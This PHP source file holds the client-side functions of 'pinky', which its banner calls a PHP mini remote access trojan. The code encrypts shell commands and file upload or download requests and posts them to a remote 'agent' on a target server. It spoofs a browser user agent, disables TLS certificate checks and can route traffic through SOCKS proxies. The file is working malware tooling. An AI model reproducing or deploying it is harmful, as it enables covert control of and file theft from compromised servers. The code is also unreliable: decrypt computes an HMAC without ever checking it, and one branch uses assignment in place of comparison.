<?php

/**
 * Encrypts a string
 *
 * @param string $plaintext Raw string to be encrypted
 * @param string $secret_key Encryption key, also required for decryption
 * @param mixed $method OpenSSL or mcrypt (legacy)
 *
 * @return string Raw data encrypted with a key
 */
function encrypt($plaintext, $secret_key, $method = 'openssl')
{
    $ciphertext = '';

    if($method=='openssl') {
        $key = $secret_key;
        $cipher = "AES-256-CBC";
        $ivlen = openssl_cipher_iv_length($cipher);
        $iv = openssl_random_pseudo_bytes($ivlen);
        $ciphertext_raw = openssl_encrypt($plaintext, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
        $hmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary = true);
        $ciphertext = base64_encode($iv . $hmac . $ciphertext_raw);
    } elseif ($method='mcrypt') {
        $key = pack('H*', $secret_key);
        $iv_size = @mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);
        $iv = @mcrypt_create_iv($iv_size, MCRYPT_RAND);
        $ciphertext = @mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $plaintext, MCRYPT_MODE_CBC, $iv);
        $ciphertext = $iv . $ciphertext;
        $ciphertext = base64_encode($ciphertext);
    }

    return $ciphertext;
}

/**
 * Decrypts an encrypted string
 *
 * @param string $ciphertext Encrypted text to be decrypted
 * @param string $secret_key Encryption key, also required for decryption
 * @param mixed $method OpenSSL or mcrypt (legacy)
 *
 * @return string Raw data encrypted with a key
 */
function decrypt($ciphertext, $secret_key, $method = 'openssl')
{
    $ciphertext_decoded = base64_decode($ciphertext);

    if($method=='openssl') {
        $key = $secret_key;
        $cipher = "AES-256-CBC";
        $ivlen = openssl_cipher_iv_length($cipher);
        $iv = substr($ciphertext_decoded, 0, $ivlen);
        $hmac = substr($ciphertext_decoded, $ivlen, $sha2len = 32);
        $ciphertext_raw = substr($ciphertext_decoded, $ivlen + $sha2len);
        $original_plaintext = @openssl_decrypt($ciphertext_raw, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
        $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary = true);
        return trim($original_plaintext);
    } elseif ($method='mcrypt') {
        $key = pack('H*', $secret_key);
        $iv_size = @mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);
        $iv_dec = substr($ciphertext_decoded, 0, $iv_size);
        $ciphertext_dec = substr($ciphertext_decoded, $iv_size);
        return trim(@mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $ciphertext_dec, MCRYPT_MODE_CBC, $iv_dec));
    }
}

/**
 * Build the request to be sent
 *
 * @param string $cmd Command
 * @param string $path Current path of the agent
 * @param string $key The encription key
 *
 * @return array
 */
function make_request($cmd, $path, $key, $method)
{
    $data = array(
        'p' => base64_encode($path)
    );
    $position = strpos($cmd, 'pinky:');
    if ($position === false) {
        $data['c'] = encrypt(base64_encode($cmd), $key, $method);
    } else {
        $cmd = str_replace('pinky:', '', $cmd);
        $input = explode(' ', $cmd);
        $action = $input[0];
        array_shift($input);
        if ($action == 'upload') {
            $data['f'] = array(); // files
            $data['f']['u'] = array(); // urls
            $data['f']['b'] = array(); // binaries
            foreach ($input as $entry) {
                if (filter_var($entry, FILTER_VALIDATE_URL)) {
                    $parsed = parse_url($entry);
                    $name = base64_encode(basename($parsed['path']));
                    $url = base64_encode($entry);
                    $array = array(
                        'n' => encrypt($name, $key, $method),
                        'p' => encrypt($url, $key, $method)
                    );
                    array_push($data['f']['u'], $array);
                } else {
                    $file = file_to_base64($entry);
                    if (!is_null($file)) {
                        $name = base64_encode(basename(realpath($entry)));
                        $array = array(
                            'n' => encrypt($name, $key, $method),
                            'p' => encrypt($file, $key, $method)
                        );
                        array_push($data['f']['b'], $array);
                    } else {
                        echo " [!] ERROR: {$entry} doesn't exists or isn't readable.\n";
                    }
                }
            }
        } elseif ($action == 'download') {
            $data['f'] = array();
            $data['f']['d'] = array(); // files to download
            foreach ($input as $entry) {
                $name = base64_encode($entry);
                array_push($data['f']['d'], encrypt($name, $key, $method));
            }
        }
    }

    return $data;
}

/**
 * Send que request to the agent and return the response
 *
 * @param string $url URL of the target
 * @param array $data Data to be sent
 * @param string $login Login user
 * @param string $password Login password
 * @param array $proxy Proxy information
 * @param string $cookies Cookies to be used
 * @return array
 */
function send_request($url, $data, $login, $password, $proxy = array(), $cookies = null)
{
    $url_components = parse_url($url);
    $b = 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0';
    $query = http_build_query($data);
    $headers = array(
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection: Keep-Alive',
        'Accept-Language: en-US,en;q=0.5',
        'Accept-Encoding: gzip, deflate, br',
        'Upgrade-Insecure-Requests: 1',
        'Cache-Control: max-age=0',
        'Authorization: Basic ' . base64_encode("{$login}:{$password}"),
        'Content-Type: application/x-www-form-urlencoded',
        'Host: ' . $url_components['host']
    );
    if (!is_null($cookies)) {
        $headers[] = 'Cookie: ' . $cookies;
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, $b);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $query);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 20);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    if (count($proxy) > 0) {
        if ($url_components['host'] != 'localhost' && $url_components['host'] != '127.0.0.1') {
            curl_setopt($ch, CURLOPT_PROXY, $proxy['ip']);
            curl_setopt($ch, CURLOPT_PROXYPORT, $proxy['port']);
            if (isset($proxy['type'])) {
                if (strtolower($proxy['type']) != 'http') {
                    if (strtolower($proxy['type']) == 'socks5') {
                        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                    }
                }
            }
        }
    }

    $result = curl_exec($ch);
    if ($result === false) {
        echo "\n\t" . curl_error($ch) . " Â¯\_(ãƒ„)_/Â¯\n\n";
    }

    $info = curl_getinfo($ch);
    curl_close($ch);
    return array(
        'status' => $info['http_code'],
        'content' => $result
    );
}


/**
 * Validate a json config file
 *
 * @param string $config Config file path
 * @return bool
 */
function is_json_valid($config)
{
    if (is_null($config) || !isset($config['key']) || !isset($config['url']) || !isset($config['login'])) {
        return false;
    }

    if (!isset($config['login']['username']) || !isset($config['login']['password'])) {
        return false;
    }

    return true;
}

/**
 * Convert a file to a base64 string
 *
 * @param string $file File path
 * @return null|string
 */
function file_to_base64($file)
{
    if (file_exists($file) && is_readable($file)) {
        return base64_encode(file_get_contents($file));
    }

    return null;
}

/**
 * Convert base64 string to a binary file and return the filename
 *
 * @param string $base64_string File encoded base64 based
 * @param string $path
 * @param string $output_file
 * @return string
 */
function base64_to_file($base64_string, $path, $output_file)
{
    if (!is_writable($path)) {
        return null;
    }

    $complete_path = $path . '/' . $output_file;
    $handle = fopen($complete_path, "wb");
    fwrite($handle, base64_decode($base64_string));
    fclose($handle);
    return $output_file;
}

/**
 * Print the welcome meessage
 *
 * @param $version
 */
function print_welcome($version)
{
    $author = "David Tavarez";
    $twitter = "@davidtavarez";
    $web = "https://davidtavarez.github.io/";
    $banner = <<<EOT
        _       _          
  _ __ (_)_ __ | | ___   _ 
 | '_ \| | '_ \| |/ / | | |
 | |_) | | | | |   <| |_| |
 | .__/|_|_| |_|_|\_\\__,  |
 |_|                 |___/  v{$version}

EOT;
    echo chr(27) . chr(91) . 'H' . chr(27) . chr(91) . 'J'; //^[H^[J
    echo "\e[1m";
    echo $banner;
    echo "\e[0m";
    echo " The PHP Mini RAT.\n\n";
    echo " \e[91m+ Author\e[0m: {$author}\n";
    echo " \e[91m+ Twitter\e[0m: {$twitter}\n";
    echo " \e[91m+ Website\e[0m: {$web}\n\n";
    $warning = <<<EOT
 +[\e[91mWARNING\e[0m\e[93m]------------------------------------------+
 | DEVELOPERS ASSUME NO LIABILITY AND ARE NOT        |
 | RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY    |
 | THIS PROGRAM  ¯\_(ツ)_/¯                          |
 +---------------------------------------------------+
 
EOT;
    echo "\e[93m";
    echo $warning;
    echo "\e[0m";
    echo "\n";
}

/**
 * Generate a random string, using a cryptographically secure
 * pseudorandom number generator (random_int)
 *
 * For PHP 7, random_int is a PHP core function
 * For PHP 5.x, depends on https://github.com/paragonie/random_compat
 *
 * @param int $length How many characters do we want?
 * @param string $keyspace A string of all possible characters
 *                         to select from
 * @return string
 * @throws Exception
 */
function random_str($length, $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
{
    $str = '';
    $max = mb_strlen($keyspace, '8bit') - 1;
    if ($max < 1) {
        throw new Exception('$keyspace must be at least two characters long');
    }
    for ($i = 0; $i < $length; ++$i) {
        $str .= $keyspace[random_int(0, $max)];
    }
    return $str;
}
